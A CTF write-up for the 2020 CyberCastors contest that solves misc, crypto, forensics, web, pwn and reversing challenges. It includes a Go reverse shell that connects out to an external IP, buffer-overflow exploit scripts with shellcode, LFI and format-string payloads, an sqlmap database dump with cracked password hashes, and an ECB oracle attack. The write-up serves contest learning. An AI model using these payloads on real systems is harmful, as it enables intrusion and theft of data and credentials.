# Cybercastors writeups for team bootplug

# Misc
## Password crack 3
```
7adebe1e15c37e23ab25c40a317b76547a75ad84bf57b378520fd59b66dd9e12

This one needs to be in the flag format first...
```

The solution here was to use a custom ruleset with hashcat, that applied the flag format to all password candidates: `^{^F^T^C^s^r^o^t^s^a^c$}`. Running rockyou.txt with this rule, produced the solution:
`7adebe1e15c37e23ab25c40a317b76547a75ad84bf57b378520fd59b66dd9e12:castorsCTF{theformat!}`
## Pitfall
```
sylv3on_ was visiting cybercastors island and thought it'd be funny to bury the flag.txt. Can you help us DIG it out?
```

```
$ dig -t TXT cybercastors.com

; <<>> DiG 9.11.9 <<>> -t TXT cybercastors.com
...
;; ANSWER SECTION:
cybercastors.com.       299     IN     TXT      "v=spf1 include:_spf.google.com ~all"
cybercastors.com.       299     IN     TXT      "flag=castorsCTF{L00K_1_DuG_uP_4_fL4g_464C4147}"
```
## To plant a seed
```
Did you know flags grow on trees? Apparently if you water them a specific amount each day the tree will grow into a flag! The tree can only grow up to a byte each day. I planted my seed on Fri 29 May 2020 20:00:00 GMT. Just mix the amount of water in the list with the tree for 6 weeks and watch it grow!
```
A file with the following sequence was provided:
```
Watering Pattern: 150 2 103 102 192 216 52 128 9 144 10 201 209 226 22 10 80 5 102 195 23 71 77 63 111 116 219 22 113 89 187 232 198 53 146 112 119 209 64 79 236 179
```

Guessing that this is about PRNG seeds, and the pattern is a flag XORed with the output, we need to find a PRNG that, when seeded with the given date, outputs numbers such that `150 ^ random_1 = 'c'` and `2 ^ random_2 = 'a'`, etc. After trying a few variants, like libc and different versions of Python, and testing ways to mask the output to 8-bit numbers,  I figured out that they used Python3 and `random.randint(0,255)`.

```python
import random
random.seed(1590782400)

nums = [150,2,103,102,192,216,52,128,9,144,10,201,209,226,22,10,80,5,102,195,23,71,77,63,111,116,219,22,113,89,187,232,198,53,146,112,119,209,64,79,236,179]

print(''.join(chr(e ^ random.randint(0,255)) for e in nums))
# castorsCTF{d0n7_f0rg37_t0_73nd_y0ur_s33ds}
```

# Coding
## Arithmetics
```python
from pwn import *

r = remote("chals20.cybercastors.com", 14429)
r.sendlineafter("ready.\n", "")

lookup = {"one":"1", "two":"2", "three":"3", "four":"4", "five":"5", "six":"6", "seven":"7", "eight":"8", "nine": "9", "minus":"-", "plus":"+", "multiplied-by":"*", "divided-by":"//"}


for count in range(100):
    q = r.recvline()
    print(count, q)
    _, _, a, op, b, _ = q.split(" ")
    if a in lookup:
        a = lookup[a]
    if b in lookup:
        b = lookup[b]
    if op in lookup:
        op = lookup[op]


    r.sendline(str(eval(a+op+b)))
    print r.recvline()
    count += 1

r.interactive()
```
## Base Runner

Saw that it was binary -> octal -> hex -> base64.
Just built upon an ugly one liner in python and pwntools, looped it 50 times and got the flag 
```python
from pwn import *
from base64 import b64decode

r = remote("chals20.cybercastors.com",14430)

r.recvuntil("ready.")
r.sendline("\n")
r.recvline()

for i in range(50):
    r.sendline(b64decode("".join([chr(int(nnn,16)) for nnn in "".join([chr(int(nn,8)) for nn in "".join([chr(int(n,2)) for n in r.recvline().decode().strip().split(" ")]).split(" ")]).split(" ")])).decode())
    print(r.recvline())

r.interactive()
```
## Flag Gods
The service asks us to provide the hamming distance between a string and some hexadecimal output. This is easily accomplished by decoding the hex string, then bitwise XORing the strings, and counting the number of "1" bits in the result.

```python
from pwn import *
from Crypto.Util.number import long_to_bytes as l2b, bytes_to_long as b2l

r = remote("chals20.cybercastors.com", 14431)
r.sendline("")

for iteration in range(80):
    _ = r.recvuntil("Transmitted message: ")
    m1 = r.recvline().rstrip()
    _ = r.recvuntil("Received message: ")
    m2 = r.recvline().rstrip().decode('hex')
    hamming = bin(b2l(xor(m1,m2))).count("1")
    r.sendline(str(hamming))

    if iteration == 79:
        break

    print iteration
    print r.recvline()
    print r.recvline()

r.interactive()
```
## Glitchity Glitch
After randomly trying a few options in the menu, I found a sequence that led to infinite selling. Instead of figuring out the bugs, or trying to optimize it any further, I just looped until I had enough money to buy the flag.

```python
from pwn import *

context.log_level = "debug"

r = remote("chals20.cybercastors.com", 14432)

r.sendlineafter("Choice: ","1")
r.sendlineafter("Choice: ","2")
r.sendlineafter("Choice: ","3")
r.sendlineafter("Choice: ","6")

for _ in range(6000//20):
    r.sendlineafter("Choice: ", "0")
    r.sendlineafter("Choice: ", "1")

r.sendline("5") # castorsCTF{$imPl3_sTUph_3h?}

r.interactive()
```

# Forensics

## Leftovers
This is HID data, but with a slight twist where multiple keys are being sent in the same packet. First we extract all the HID data packets.

`tshark -r interrupts.pcapng -T fields -e usb.capdata > usbdata.txt`

Some manual cleanup is required afterwards; namely deleting blank lines and deleting metadata PDUs (which have a different length).

After this, you just run your run-of-the-mill HID parser, just to see that it doesn't support Caps Lock, and assumes only one key is arriving at any point. Adding caps-lock support, I'm left with

`what dooyoo  thhnng yyuu will ffnnn herr? thhss? csstossCTF{1stiswhatyoowant}`

and these letters that are pressed, but couldn't be merged with the earlier output: `uuuiiioooiiiddeeiiiaarruu`. Through manual comparison of the provided strings, and filtering out some double letters, it's clear that the flag must be `castorsCTF{1stiswhatyouwant}`.

## Manipulation
The challenge has a .jpg file, but the contents are actually output from `xxd`. The first line is also moved to the bottom. We can undo this by moving the last line to the top, using a text editor, then running `xxd -r` on the file. This produces a valid JPG file with two flags on it. The last flag was the correct one.

## Father Taurus Kernel Import!
Loaded dump into Autopsy, let it scan. Found a deleted file `Secrets/_lag.txt` (originally flag.txt?) with contents
`Y2FzdG9yc0NURntmMHIzbnMxY1NfbHNfSVRzXzBXbl9iMFNTfQ==`, which after base64 decoding becomes `castorsCTF{f0r3ns1cS_ls_ITs_0Wn_b0SS}`.

# General

# Web

## Bane Art
This challenge has a very obvious LFI vulnerability, and php wrappers are enabled. After some probing around, reading files with
`http://web1.cybercastors.com:14438/app.php?topic=php://filter/convert.base64-encode/resource=<FILENAME>`
and abusing `/proc/self/fd/7` as a semi-RCE, we find the flag located at
`/home/falg/flag/test/why/the/hassle/right/flag.txt`.

Final payload is then `http://web1.cybercastors.com:14438/app.php?topic=php://filter/convert.base64-encode/resource=/home/falg/flag/test/why/the/hassle/right/flag.txt`

`castorsCTF{w3lc0m3_2_D4_s0urc3_YoUng_Ju4n}`

## Shortcuts
Saw you could upload your own shortcuts, however if you uploaded `<filename>` and clicked it, the webapp tried to `go run <filename>.go`. 
I circumvented this by just uploading `<filename>` and `<filename>.go` to the shortcuts app with the same content, then clicking the `<filename>` link.

the go code I uploaded was some sample rev-shell code from pentestmonkey.
```go
package main

import (
        "net"
        "os/exec"
        "time"
)

func main() {
        reverse("167.99.202.x:8080")
}

func reverse(host string) {
        c, err := net.Dial("tcp", host)
        if nil != err {
                if nil != c {
                        c.Close()
                }
                time.Sleep(time.Minute)
                reverse(host)
        }

        cmd := exec.Command("/bin/sh")
        cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
        cmd.Run()
        c.Close()
        reverse(host)
}
```

After that I found the flag in /home/tom/flag.txt 

## Quiz
Saw a simple quiz app, apparently written in Go. Tried lots of stuff with the questionaire, could provoke a strconv error when setting question number to something that was not a number, but nothing else interesting.

After some directory brute forcing we found /backup/, giving us the soruce code.

### Function & routes
```go
    mux := httprouter.New()

    mux.GET("/", index)
    mux.GET("/test/:directory/:theme/:whynot", super)
    mux.GET("/problems/math", math)
    mux.POST("/problems/math", mathCheck)

    //Remember to Delete
    mux.GET("/backup/", backup)
```
```go
func super(w http.ResponseWriter, req *http.Request, ps httprouter.Params) {
    fmt.Println(ps.ByName("whynot"))
    var file string = "/" + ps.ByName("directory") + "/" + ps.ByName("theme") + "/" + ps.ByName("whynot")
    test, err := os.Open(file)
    handleError(w, err)
    defer test.Close()

    scanner := bufio.NewScanner(test)
    var content string
    for scanner.Scan() {
        content = scanner.Text()
    }

    fmt.Fprintf(w, "Directories: %s/%s\n", ps.ByName("directory"), ps.ByName("theme"))
    fmt.Fprintf(w, "File: %s\n", ps.ByName("whynot"))
    fmt.Fprintf(w, "Contents: %s\n", content)
}
```
After inspecting the source code we see that the super function gives us LFI, but only the last line in the file we want to view.

We tried alot of stuff, including viewing the .csv files, different files in /proc, until we finally looked at the description hinting to the name jeff. 

```bash
curl --path-as-is -g 'http://web1.cybercastors.com:14436/test/home/jeff/flag.txt' -o -
Directories: home/jeff
File: flag.txt
Contents: castorsCTC{wh0_l4iks_qUiZZ3s_4nyW4y}
```

## Car Lottery
We're presented with a website that says you need to be visitor number N, for some large number N, in order to buy a car. Inspecting the requests, it's clear that this is set through cookies, and we can gain access by setting the cookie `client=3123248`. This allows us to browse the cars, by querying for data. Probing around here a bit, reveals an SQLi vulnerability in the lookup. We dump the entire database with this.

`python sqlmap.py -o -u "http://web1.cybercastors.com:14435/search" --data "id=1" --cookie="client=3123248" --dump-all`

Inspecting the data, there's a table called `Users` with the following contents:

```
Username,Password
admin@cybercastors.com,cf9ee5bcb36b4936dd7064ee9b2f139e
admin@powerpuffgirls.com,fe87c92e83ff6523d677b7fd36c3252d
jeff@homeaddress.com,d1833805515fc34b46c2b9de553f599d
moreusers@leakingdata.com,77004ea213d5fc71acf74a8c9c6795fb
```

Which are easily cracked

```
cf9ee5bcb36b4936dd7064ee9b2f139e:naruto 
fe87c92e83ff6523d677b7fd36c3252d:powerpuff
d1833805515fc34b46c2b9de553f599d:pancakes
77004ea213d5fc71acf74a8c9c6795fb:fun
```

Here we got stuck for a while, until an admin hinted towards scanning for endpoints. This gave us `http://web1.cybercastors.com:14435/dealer`, where we could use the credentials above to log in and get the flag.

`castorCTF{daT4B_3n4m_1s_fuN_N_p0w3rfu7}`
## Mixed Feelings
Found some commented out "php" code.

```php 
if(isset($file)) {
    if ($user == falling_down_a_rabit_hole) {
        exit()?
    }
    else {
        go to .flagkindsir
    }
}
```

http://web1.cybercastors.com:14439/.flagkindsir

Found this link

When we click the buttons it posts cookies=cookies or puppies=puppies. 

So we tried flags=flags, then on a whim cookies=flag, and it worked.

```bash
curl 'http://web1.cybercastors.com:14439/.flagkindsir' --data-raw "cookies=flag"
```
 

# Crypto
## One Trick Pony
just OTP where the flag is the key. so just input some known plaintext and get encrypted text. 
```bash
➜  Mixed Feelings echo -n "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" | nc chals20.cybercastors.com 14422

> b'\x02\x12\x15\x0e\x13\x12"5\'\x1a\nRR\x11>\x18Q\x14\x13>\nR\x18T>TR\x02\x13'
```
Then XOR the encrypted text with the known plaintext.
```python
>>> from pwn import xor
>>> xor("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",b'\x02\x12\x15\x0e\x13\x12"5\'\x1a\nRR\x11>\x18Q\x14\x13>\nR\x18T>TR\x02\x13')
b'cstorsCTF{k33p_y0ur_k3y5_53crcstorsCTF{k33p_y0'
```

## Magic School Bus
Here we're presented with a service that serves up a scrambled flag, and can scramble arbitrary inputs. There's two ways to solve this: modify the input until its scrambled output matches the flag output, or figure out the scramble. We figured out the scramble indexes by scrambling strings like "BAAA...", "ABAA..." and noting where the 'B' ended up each time. Then applied this in reverse to the scrambled flag.

```python
from pwn import *

lookup = []
flag_len = 46

r = remote("chals20.cybercastors.com", 14421)

for i in range(flag_len):
    s = list("A"*flag_len)
    s[i] = "B"
    s = ''.join(s)
    r.sendline("1")
    _ = r.recv()
    r.sendlineafter("Who's riding the bus?: ", s)
    resp = r.recvline().strip().split()[2]
    lookup.append(resp.index("B"))

# lookup = [11, 23, 17, 5, 34, 40, 0, 29, 12, 24, 18, 6, 35, 41, 1, 30, 13, 25, 19, 7, 36, 42, 2, 31, 14, 26, 20, 8, 37, 43, 3, 32, 15, 27, 21, 9, 38, 44, 4, 33, 16, 28, 22, 10, 39, 45]

assert sorted(lookup) == range(flag_len)

r.sendline("2")
r.recvuntil("Flag bus seating: ")
flag = r.recvline()
print flag # SNESYT3AYN1CTISL7SRS31RAFSKV3C4I0SOCNTGER0COM5

final_flag = [None] * flag_len
for i in range(flag_len):
    final_flag[i] = flag[lookup[i]]

print(''.join(final_flag))
```

Adding underscores we get `CASTORSCTF{R3C0N4ISSANCE_IS_K3Y_TO_S0LV1NG_MYS73R1E5}`

## Warmup
Simple math, using the formulas
`a=p+q, b=p-q, a^2+b^2=c^2, A=a*b/2`
we end up with an equation for q and p alone, e.g.
`2*q^2 = (c^2)/2 - A/2`

However, the `c` variable we've been given, is actually `c^2`, so the results were strange at first. After figuring this out, we can calculate p and q to decrypt the flag.

```python
p = gmpy2.iroot(((c) // 4) - A, 2)[0]
q = gmpy2.iroot(((c) // 4) + A, 2)[0]
d = gmpy2.invert(e, (p-1)*(q-1))
m = pow(enc, d, p*q)
# castorsCTF{n0th1ng_l1k3_pr1m3_numb3r5_t0_w4rm_up_7h3_3ng1n3s}
```

## Two Paths
Inside the image, there's some binary code that sends us off to `https://ctf-emoji-cipher.s3.amazonaws.com/decode_this.html`. And inside one of the color planes, we see a link sending us to `https://ctf-emoji-cipher.s3.amazonaws.com/text_cipher.htm`. I assume these are the two paths.

The first page has a ton of emojis, intersped with symbols like `_{},.!`. Removing all non-emojis, we see that there's 26 unique emojis, so it's likely a mapping to the English alphabet. Doing some basic tests does not reveal a probable mapping though, so it's likely some gibberish in the text. However, the second URL shows a message log between two persons, where one is speaking with text and the other in emoji. From the inital few sentences, we can guess that the emoji man is saying "hi" and "all good, you?". Using these translations lets us guess more and more letter mappings, until we have the entire text recovered.

```
congratulations!_if_you_can_read_this,_then_you_have_solved_the_cipher!_we_just_hope_you_found_a_more_efficient_way_for_deciphering_than_going_one_by_one_or_else_you_won't_get_through_the_next_part_very_quickly._maybe_try_being_a_little_more_lazy!
```

This text block is followed by a ton of flag-looking strings, where only one of them is the actual flag. This is why statistical tests failed to automatically decrypt this.

`castorsCTF{sancocho_flag_qjzmlpg}`

## Bagel Bytes
We solved this before the code was released, and we're a bit unsure why such a huge hint was revealed after the challenge had been solved.

In this challenge, we get access to a service that lets us encrypt our own plaintexts, and also encrypt the flag with a chosen prefix. Fiddling about a bit, reveals that this is AES in ECB mode, which has a very common attack if you're given an oracle like here. Just ask the server to encrypt `"A"*15 + flag`. Then encrypt blocks like `"A"*15 + c` for every `c` in the printable alphabet, until you find a block similar to the flag block. This reveals a single letter of the flag. Now replace the last "A" with the first letter of the recovered flag, and repeat until the entire block is recovered.

To recover the next block, we can just use the first block as a prefix instead of using `"A"`, and look at the next block of the output. Here's some code for recovering the first block.

```python
from pwn import *
from string import printable

ALPHA = printable.strip()
ALPHA = ALPHA
r = remote("chals20.cybercastors.com", 14420)

def bake(s):
    r.sendlineafter("Your choice: ", "1")
    r.sendlineafter("> ", s)
    _ = r.recvline()
    _ = r.recvline()
    return r.recvline().strip()

def bakeflag(s):
    r.sendlineafter("Your choice: ", "2")
    r.sendlineafter("> ", s)
    _ = r.recvline()
    _ = r.recvline()
    return r.recvline().strip()


flag = ""
for i in range(16):
    target = bakeflag("A"*(15-i))[:32]
    
    print("Target", target)
    
    for c in ALPHA:
        h = bake((flag + c).rjust(16, "A"))
        print("h", c, h)
        if target == h:
            flag += c
            print(flag)
            break
    else:
        assert False

# flag = "castorsCTF{I_L1k"
```

Repeating this 3 times, looking at higher offsets when picking the `target` variable, we recover `castorsCTF{I_L1k3_muh_b4G3l5_3x7r4_cr15pY}`.

## Jigglypuff's song
Instead of LSB stego, this challenge opted to do MSB stego. Simply use stegsolve to pick out the MSB of red, green and blue layers to recover a long text of rickrolls and `castorsCTF{r1ck_r0ll_w1ll_n3v3r_d3s3rt_y0uuuu}`
## Amazon
Each letter of the flag has been multiplied with a prime number, in increasing order.

```python
import gmpy2
nums = [198,291,575,812,1221,1482,1955,1273,1932,2030,3813,2886,1968,4085,3243,5830,5900,5795,5628,3408,7300,4108,10043,8455,6790,4848,11742,10165,8284,5424,14986,6681,13015,10147,7897,14345,13816,8313,18370,8304,19690,22625]

flag = ""
p=2

for num in nums:
    flag += chr(num // p)
    p = gmpy2.next_prime(p)

print(flag)
```
## 0x101 Dalmatians
A continuation of Amazon, the change here is that the result is taken modulo 0x101
```python
import gmpy2

nums = [198, 34, 61, 41, 193, 197, 156, 245, 133, 231, 215, 14, 70, 230, 33, 231, 221, 141, 219, 67, 160, 52, 119, 4, 127, 50, 19, 140, 201, 1, 101, 120, 95, 192, 20, 142, 51, 191, 188, 2, 33, 121, 225, 93, 211, 70, 224, 202, 238, 114, 194, 38, 56]

flag = ""
p=2

for num in nums:
    for i in range(256):
        if (p*i) % 0x101 == num:
            flag += chr(i)
            break
    p = gmpy2.next_prime(p)

print(flag)
```
## Stalk Market
To obtain the flag here, we need to guess the highest price out of 12 possibilities, 20 times in a row. The prices are picked based on some buckets of numbers, all rolled from the python random module. We're also given a commit hash for each price, to prove that the price was indeed pre-determined. We're also given the price of monday at AM each round.

The hashing algorithm does the following:

- Set initial state to a constant
- Pad input and split into chunks of 16 bytes
- For each chunk, do 8 rounds of:
-- XOR state with the chunk
-- Perform sbox lookup for each byte in the state
-- Permute all state bytes according to a pbox.

The commit hashes are computed like `hash(secret + pad("mon-am-123"))`, where the secret value is exactly 16 bytes, or 1 chunk. The same secret is used for every price in a given round, and is also revealed after our guess for verification purposes.

A huge flaw here, is that after processing the secret block, the state will be **the same** for each calculated price. Then it applies the hashing algorithm to the time+price string. We can then basically say that the state after the first 8 rounds, is the actual initial state, instead of the secret. Since we know the price for monday at 12, we can undo all the hashing steps for the last block, to recover this "new secret". Then we can brute-force the prices for each time of the day, starting at the new secret, until it matches the commit we've been given. Now we know the prices, and can easily make the right guess.

```python
from pwn import *

def pad(s):
    if len(s) % 16 == 0:
        return s
    else:
        pad_b = 16 - len(s) % 16
        return s + bytes([pad_b]) * pad_b

def repeated_xor(p, k):
    return bytearray([p[i] ^ k[i] for i in range(len(p))])

def group(s):
    return [s[i * 16: (i + 1) * 16] for i in range(len(s) // 16)]

sbox = [92, 74, 18, 190, 162, 125, 45, 159, 217, 153, 167, 179, 221, 151, 140, 100, 227, 83, 8, 4, 80, 75, 107, 85, 104, 216, 53, 90, 136, 133, 40, 20, 94, 32, 237, 103, 29, 175, 127, 172, 79, 5, 13, 177, 123, 128, 99, 203, 0, 198, 67, 117, 61, 152, 207, 220, 9, 232, 229, 120, 48, 246, 238, 210, 143, 7, 33, 87, 165, 111, 97, 135, 240, 113, 149, 105, 193, 130, 254, 234, 6, 76, 63, 19, 3, 206, 108, 251, 54, 102, 235, 126, 219, 228, 141, 72, 114, 161, 110, 252, 241, 231, 21, 226, 22, 194, 197, 145, 39, 192, 95, 245, 89, 91, 81, 189, 171, 122, 243, 225, 191, 78, 139, 148, 242, 43, 168, 38, 42, 112, 184, 37, 68, 244, 223, 124, 218, 101, 214, 58, 213, 34, 204, 66, 201, 180, 64, 144, 147, 255, 202, 199, 47, 196, 36, 188, 169, 186, 1, 224, 166, 10, 170, 195, 25, 71, 215, 52, 15, 142, 93, 178, 174, 182, 131, 248, 26, 14, 163, 11, 236, 205, 27, 119, 82, 70, 35, 23, 88, 154, 222, 239, 209, 208, 41, 212, 84, 176, 2, 134, 230, 51, 211, 106, 155, 185, 253, 247, 158, 56, 73, 118, 187, 250, 160, 55, 57, 16, 17, 157, 62, 65, 31, 181, 164, 121, 156, 77, 132, 200, 138, 69, 60, 50, 183, 59, 116, 28, 96, 115, 46, 24, 44, 98, 233, 137, 109, 49, 30, 173, 146, 150, 129, 12, 86, 249]
p = [8, 6, 5, 11, 14, 7, 4, 0, 9, 1, 13, 10, 2, 3, 15, 12]
round = 8

inv_s = [sbox.index(i) for i in range(len(sbox))]
inv_p = [p.index(i) for i in range(len(p))]

DAYTIMES = ["mon-pm", "tue-am", "tue-pm", "wed-am", "wed-pm", "thu-am", "thu-pm", "fri-am", "fri-pm", "sat-am", "sat-pm"]

def reverse_state(s, guess):
    state = bytes.fromhex(s)
    for _ in range(round):
        temp = bytearray(16)
        for i in range(len(state)):
            temp[inv_p[i]] = state[i]
        state = temp

        for i in range(len(state)):
            state[i] = inv_s[state[i]]

        state = repeated_xor(state, guess)
    return state.hex()

def hash(data, init):
    state = bytes.fromhex(init)
    data = group(pad(data))
    for roundkey in data:
        for _ in range(round):
            state = repeated_xor(state, roundkey)
            for i in range(len(state)):
                state[i] = sbox[state[i]]
            temp = bytearray(16)
            for i in range(len(state)):
                temp[p[i]] = state[i]
            state = temp
    return state.hex()

r = remote("chals20.cybercastors.com", 14423)

for _ in range(20):
    _ = r.recvuntil("Price commitments for the week: ")
    hashes = [e.decode() for e in r.recvline().rstrip().split()]
    _ = r.recvuntil("Monday AM Price: ")
    monam_price = r.recvline().strip().decode()
    guess = pad(f"mon-am-{monam_price}".encode())
    init = reverse_state(hashes[0], guess)

    best_price = int(monam_price)
    best_time  = "mon-am"

    for ix, time in enumerate(DAYTIMES):
        for price in range(20, 601):
            guess = pad(f"{time}-{price}".encode())
            h = hash(guess, init)
            if h == hashes[ix+1]:
                print(time, price)
                if price > best_price:
                    best_price = price
                    best_time = time
                break
        else:
            assert False
    
    r.sendline(best_time)

r.interactive()
```

`Even Tom Nook is impressed. Here's your flag: castorsCTF{y0u_4r3_7h3_u1t1m4t3_turn1p_pr0ph37}`


# PWN

## abcbof
Very simple buffer overflow, to overwrite the next variable with `CyberCastors`. Simply send a string with tons of padding, which ends in `CyberCastors`. Even when unsure about the exact padding length, multiple lengths can be tested.


## babybof1 part 1
ROP to the `get_flag` function.
```python
from pwn import *
import time

context.arch = "x86_64"

elf = ELF("babybof")
r = remote("chals20.cybercastors.com", 14425)

payload = "A"*264
payload += p64(elf.symbols["get_flag"])
r.sendline(payload)
r.shutdown("send")
r.interactive()
```
Running it yields the flag: `castorsCTF{th4t's_c00l_but_c4n_y0u_g3t_4_sh3ll_n0w?}`

## babybof1 pt2
Same start as the babybof1 challenge, except this time we need a shell. Since the stack is executable, and RAX contains a pointer to the array `gets()` wrote to, we use a "jmp rax" gadget to execute our shellcode.

*Replaces the payload in pt 1*

```python
JMP_RAX = 0x0000000000400661
payload = asm(shellcraft.sh()).ljust(264, "\x90")
payload += p64(JMP_RAX)
r.sendline(payload)
r.interactive()
```
When we have a shell we can cat the `shell_flag.txt`
```console
Welcome to the cybercastors Babybof
Say your name: sh: 0: can't access tty; job control turned off
$ ls
babybof  flag.txt  shell_flag.txt
$ cat shell_flag.txt
castorsCTF{w0w_U_jU5t_h4ck3d_th15!!1_c4ll_th3_c0p5!11}
```

## Babybof2
We get a binary file called`winner` and a service to connect to.
When running the program it asks for which floor the winners table is at. 
After opening up the program in IDA, we quickly find an unused function called `winnersLevel`. The function checks if the argument of this function is either one of two integers (258 (0x102) or 386 (0x182)). If the number is correct it prints the flag, or else it prints an info message that the badge number is not correct. We can overflow the input buffer using gets and overwrite the return address with the address of the `winnersLevel` function. We also need to send in the correct argument to this function to get the flag.

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('winners')
host = args.HOST or 'chals20.cybercastors.com'
port = int(args.PORT or 14434)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit --- #
io = start()

winners_addr = exe.symbols["winnersLevel"] # Address of the winnersLevel function
p = cyclic(cyclic_find(0x61616174)) # Send input of cyclic 100 to program to find the offset where we can write a new return address.
p+= p32(winners_addr)
p+= b'a'*4
p+= p32(0x102) # Send in the correct integer value the function expects to print the flag

if args.LOCAL:
    io.sendlineafter('is the table at: \n', p)
else:
    io.sendline(p) # Some issues with the remote service, se we need to send the exploit right away and not wait for any prompt.
    
io.interactive()
```
The flag is: `castorsCTF{b0F_s_4r3_V3rry_fuN_4m_l_r1ght}`

## babyfmt
Simple format string

Spammed some `%lx` and after decoding the hex I could see the flag, narrowed down to the `%lx`'s I needed.
```c
nc chals20.cybercastors.com 14426

Hello everyone, this is babyfmt! say something: %8$lx%9$lx%10$lx%11$lx%12$lx%13$lx
%8$lx%9$lx%10$lx%11$lx%12$lx%13$lx
4373726f747361635f6b34336c7b46543468745f6b34336c74346d7230665f745f366e317274735f7d6b34336c```

decoded the hex string, however the flag was divided into 8 char indices which had to be reversed, which I did with python.

```python
>>> s = "Csrotsac_k43l{FT4ht_k43lt4mr0f_t_6n1rts_}k43l"
>>> "".join([s[i:i+8][::-1] for i in range(0,len(s),8)])
'castorsCTF{l34k_l34k_th4t_f0rm4t_str1n6_l34k}'
```

# Rev

## Reverse-me
The binary is reading a flag.txt file, applies some mapping function on each of the bytes, and dump them to the screen. Then it asks us to input the flag for verification.

We solved this by just encrypting A-Z, a-z, 0-9 etc. and creating a mapping table for it.

```python
lookup = {e2:e1 for e1, e2 in zip("abcdefghijklmnopqrstuvwx", "6d6e6f707172737475767778797a6162636465666768696a".decode('hex'))}
for e1, e2 in zip("ABCDEFGHIJKLMNOPQRSTUVWX", "434445464748494a4b4c4d4e4f505152535455565758595a".decode('hex')):
    assert not e2 in lookup
    lookup[e2] = e1
for e1, e2 in zip("0123456789", "32333435363738393a3b".decode('hex')):
    assert not e2 in lookup
    lookup[e2] = e1


flag = "64 35 68 35 64 37 33 7a 38 6b 33 37 6b 72 67 7a".replace(" ","").decode('hex')
print(''.join(lookup.get(e,'_') for e in flag))
```

`castorsCTF{r3v3r51n6_15_fun}`
## Mapping
Very similar to the Reverse-me challenge, except it's golang, and the output is base64-encoded before comparing it to the scrambled flag. I input the entire ASCII alphanum charset, set a breakpoint in the base64-encoding function, and read out the mapping table that was given as an argument to it. Then I extract the encoded flag used for comparison, decoded it and undid the mapping.

```python
import base64
from string import maketrans

a = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
b = "5670123489zyxjklmdefghinopqrstuvwcbaZYXFGABHOPCDEQRSTUVWIJKNML"
flag = "eHpzdG9yc1hXQXtpYl80cjFuMmgxNDY1bl80MXloMF82Ml95MDQ0MHJfNGQxbl9iNXVyMn0="

tab = maketrans(b,a)

print(base64.b64decode(flag).translate(tab))
```

`castorsCTF{my_7r4n5l4710n_74bl3_15_b3773r_7h4n_y0ur5}`

## Ransom
The binary here, is basically encrypting flag.png, and we're provided with  an encrypted flag file and a traffic log. Looking at the file length, it's reasonable to believe that it's a stream cipher, which often can be undone by simply encrypting again. This is because stream ciphers often just XOR the plaintext with a bytestream.

But before the binary tries to encrypt, it tries to contact a webserver at 192.168.0.2:8081 and ask for a seed. If it is not able to successfully complete a handshake with this server, it will pick a random seed based on the current time.

We set up a basic flask server that with the endpoint `/seed`, that responds `1337` to GET requests and `ok\n` to POST requests. This matches the traffic seen in the traffic log. When we apply this to the original flag file, we get a valid PNG file with the flag on it. (Until we added the newline, it randomly encrypted things every time).

![](https://i.imgur.com/t3Zywth.png)


## Octopus
Before the new binary was dropped, this challenge looked like a very hard encoding challenge. After the update, it's a matter of removing the certificate header/footer, fixing newlines with dos2unix, then decoding the base64 into an ELF file. Running this ELF, spits out the flag in base64-encoded form.

```bash
root@bd2ba35b12d7:/ctf/work# ./obfus
Estou procurando as palavras para falar em inglês ...
Aqui vou
[Y 2 F z d G 9 y c 0 N U R n t X a D B f c z Q x Z F 9 B b l k 3 a G x u R 1 9 C M H V U X 2 0 0 d E h 9]
```

`castorsCTF{Wh0_s41d_AnY7hlnG_B0uT_m4tH}`

